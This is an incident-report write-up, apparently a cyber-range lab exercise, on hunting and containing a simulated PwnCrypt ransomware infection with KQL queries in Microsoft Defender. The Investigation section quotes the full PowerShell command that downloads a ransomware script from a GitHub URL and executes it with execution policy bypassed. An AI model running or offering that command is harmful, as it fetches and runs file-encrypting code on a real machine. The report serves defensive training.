

# Zero-Day Ransomware (PwnCrypt) Outbreak Project 
## 🛡️ Incident Report: PwnCrypt Ransomware Detection and Containment

# Objective:
Identify any suspicious zero-day PwnCrypt ransomware infection, isolate the affected system, and prevent lateral movement within the corporate network.

---
# Tools & Technology:
- Azure Virtual Machine
- PowerShell 
- Microsoft Defender
- KQL Query

---
# Table of contents

- [1. Summary](#1-summary)
- [2. Preparation](#2-preparation)
- [3. Data Collection](#3-data-collection)
- [4. Data Analysis](#4-data-analysis)
- [5. Investigation](#5-investigation)
- [6. Response](#6-response)
- [7. MITRE ATT&CK Mapping](#7-mitre-attck-mapping)
- [8. Lessons Learned / Improvement:](#8-lessons-learned--improvement)
- [9. Final Status](#9-final-status)
---



## 1. Summary
Incident Title: PwnCrypt Ransomware Detection and Containment <br />
Date Identified: June 21, 2025 <br />
Reported By: Security Operations Team <br />
Affected Asset: fe-vmlab (Windows Endpoint) <br />
Investigator: Fe Esguerra <br />
Severity: High <br />


## 2. Preparation
### Goal:
A newly identified ransomware variant known as PwnCrypt has been reported in the wild. This strain uses a PowerShell-based payload to encrypt files on compromised systems with AES-256 encryption. It specifically targets directories such as C:\Users\Public\Desktop, appending a .pwncrypt tag to file names (e.g., hello.txt becomes hello.pwncrypt.txt). Due to the potential risk of this ransomware spreading within the corporate environment, the CISO has requested a proactive investigation across the organization’s systems.


### Hypothesis:
Given the organization's relatively immature security posture—particularly the lack of user awareness training—there is a credible concern that the ransomware may already be present within the network. The investigation should begin by searching for known indicators of compromise (IOCs), such as files containing the .pwncrypt string in their names.


## 3. Data Collection
### Data Sources Queried:
#### DeviceFileEvents
```kql
DeviceFileEvents
| take 20
```
![zero1](https://github.com/user-attachments/assets/e8264fa2-66b3-471d-ac3f-9c84f497029d)

```kql
DeviceFileEvents
| where DeviceName == "fe-vmlab"
| order by Timestamp desc 

```
![zero2](https://github.com/user-attachments/assets/45932041-4d9e-4f3b-b0f9-536382eee67c)



## 4. Data Analysis

#### DeviceFileEvents
```kql
let VMName = "fe-vmlab";
DeviceFileEvents
| where DeviceName == VMName
| where FileName contains "_pwncrypt"
| order by Timestamp desc
```
![zero3](https://github.com/user-attachments/assets/2e9ec255-02cb-494c-b0e4-96ceb414648f)

#### DeviceProcessEvents
```kql
let VMName = "fe-vmlab";
let specificTime = datetime(2025-06-21T17:21:52.5530575Z);
DeviceProcessEvents
| where DeviceName == VMName
| where Timestamp between ((specificTime - 3m) .. (specificTime + 3m))
| order by Timestamp desc

```

![zero4](https://github.com/user-attachments/assets/c05a2b44-f070-4ef9-9dee-fffab6fe2fd5)

#### Findings

Upon reviewing the PowerShell script, it was observed that it performs the following actions:

- Downloads another PowerShell script from a GitHub repository

- Saves the downloaded script to C:\ProgramData\pwncrypt.ps1

- Executes the script while bypassing the system’s configured execution policy

![zero5](https://github.com/user-attachments/assets/2d747650-a6d6-4b26-9e0f-77b94ef44264)



## 5. Investigation

### Initial Discovery
•	Source of Threat: PowerShell command run locally on the host:
```ps
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
```

### Observed Behavior: Files on the desktop were encrypted with _pwncrypt added to their names (e.g., report.docx_pwncrypt.docx).
#### Indicators of Compromise (IOCs)
-	File name patterns: *pwncrypt*
-	Command-line execution from PowerShell
-	Location: C:\ProgramData\pwncrypt.ps1
-	Network activity: None observed during encryption window
####  Timeline of Events
Time (UTC)	Event
17:21:52	.pwncrypt file detected in DeviceFileEvents
±3 mins	PowerShell script downloaded and executed from GitHub
Immediate	Files began being encrypted and renamed
Shortly after	Host fe-vmlab was isolated from the network



## 6. Response
### Actions Taken:

- Isolated the host from the network. 
- Reimaging of the affected endpoint.


## 7. MITRE ATT&CK Mapping

- T1059.001 – PowerShell  
- T1204.002 – User Execution: Malicious File  
- T1105 – Ingress Tool Transfer  
- T1486 – Data Encrypted for Impact  
- T1005 – Data from Local System  
- T1036 – Masquerading (potential)  
- T1027 – Obfuscated Files or Information (potential)


## 8. Lessons Learned / Improvement: 

Review PowerShell execution policies and endpoint monitoring rules

## 9. Final Status

Threat Contained: ✅

Device Isolated: ✅

Device Action: Ticket submitted for full rebuild




